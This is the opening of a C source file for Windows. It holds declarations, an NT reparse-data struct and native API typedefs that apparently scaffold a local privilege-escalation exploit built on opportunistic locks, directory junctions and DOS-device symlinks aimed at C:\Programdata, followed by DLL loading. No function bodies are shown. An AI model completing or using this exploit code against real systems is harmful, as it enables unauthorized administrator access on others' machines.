#include <windows.h>
#include <winternl.h>
#include <combaseapi.h>
#include <comdef.h>
#include <shlwapi.h>
#include <AclAPI.h>
#include "FileOplock.h"
#include "resource.h"


#pragma warning(disable:4996)
#pragma comment(lib,"Rpcrt4.lib")
#pragma comment(lib,"Shlwapi.lib")
BOOL LoadDLL(WCHAR*);
WCHAR* GetPrinterDrivers();
VOID Prepare();
INT GetCurrentUserSid(PSID* sid);
BOOL SetACL();
BOOL CreateJunction(HANDLE dir, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DeleteJunction(HANDLE hDir);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
LPWSTR BuildPath(LPCWSTR path);
BOOL Move(HANDLE hFile);
void cb0();
void load();
LPWSTR GenTmp();
VOID SetOplock();
VOID Trigger();
VOID DoMain();
BOOL CleanWer();
VOID Watch();
VOID start();
BOOL firstdone = FALSE;
HANDLE hdir;
HANDLE hFile2, hDir, hDir2 = NULL, hDir3, hFile;
WCHAR target[256] = L"\\??\\C:\\Programdata";
WCHAR file[256] = { 0x0 };
WCHAR object[256] = { 0x0 };
WCHAR dir[512] = { 0x0 };
NTSTATUS retcode;
DWORD sessionid;
PFILE_NOTIFY_INFORMATION fi = NULL;
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);



typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenDirectoryObject)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryDirectoryObject)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG FileInformationClass
    );

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateFile pNtCreateFile;
_NtSetInformationFile pNtSetInformationFile;

